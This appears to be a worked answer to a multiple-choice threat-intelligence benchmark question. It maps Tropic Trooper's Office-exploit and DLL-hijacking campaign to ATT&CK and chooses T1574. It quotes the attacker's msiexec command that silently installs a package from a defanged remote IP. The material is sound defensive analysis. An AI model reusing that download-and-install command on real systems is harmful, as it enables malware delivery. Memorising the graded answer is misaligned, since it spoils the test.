### Step-by-Step Analysis

#### 1. Analyze the CTI Report

**Initial Access:**
- Tropic Trooper exploited CVE-2017-11882 or CVE-2018-0802 in Microsoft Office's Equation Editor.
- They downloaded and installed an MSI package using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.

**Persistence:**
- The backdoor loads and decrypts a configuration file.
- It uses SSL to connect to C&C servers.

**Defense Evasion:**
- DLL hijacking was used to evade antivirus detection.
- The installer dropped three files and created a hidden directory (UFile) in `C:\ProgramData\Apple\Update\`.
- The loader, named FakeRun, executed `dllhost.exe` and injected a malicious DLL (the backdoor) into this process.

**Command and Control:**
- TClient used custom SSL libraries to connect to the C&C server.
- The C&C server and configuration values are not hardcoded, allowing for easy updates.

**Others:**
- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware.
- The MSI file drops three files and creates a hidden directory.
- `sidebar.exe` loads the malicious `wab32res.dll` through DLL hijacking to evade AV detection.

#### 2. Analyze the Question

The question asks about the ATT&CK technique that most likely occurred as part of executing the backdoor installer that abused BITSadmin to create a job and launch `sidebar.exe`.

#### 3. Compare and Evaluate

**Answer Choices:**
- **A: T1204.001-Malicious Link**: This technique involves tricking users into clicking a malicious link, which is not relevant to the described sequence.
- **B: T1059-Command and Scripting Interpreter**: This technique involves using command-line interfaces or scripts to execute commands, which is not directly mentioned in the context of the backdoor installer.
- **C: T1574-Hijack Execution Flow**: This technique involves altering the execution flow of legitimate programs to execute malicious code, which aligns with the use of DLL hijacking to load `wab32res.dll` through `sidebar.exe`.
- **D: T1558.001-Golden Ticket**: This technique involves creating and using Kerberos golden tickets, which is not relevant to the described sequence.

#### 4. Provide a Step-by-Step Reasoning and Final Answer

- **Initial Access**: Tropic Trooper exploited Microsoft Office vulnerabilities to download and install an MSI package.
- **Persistence and Defense Evasion**: The installer dropped files and created a hidden directory. It used DLL hijacking to load `wab32res.dll` through `sidebar.exe` to evade antivirus detection.
- **Command and Control**: The backdoor used custom SSL libraries to connect to the C&C server.

The question specifically mentions the use of BITSadmin to create a job and launch `sidebar.exe`. While BITSadmin is not explicitly mentioned in the CTI report, the use of `sidebar.exe` to load the malicious `wab32res.dll` through DLL hijacking is a clear example of hijacking the execution flow.

**Final Answer: C: T1574-Hijack Execution Flow**
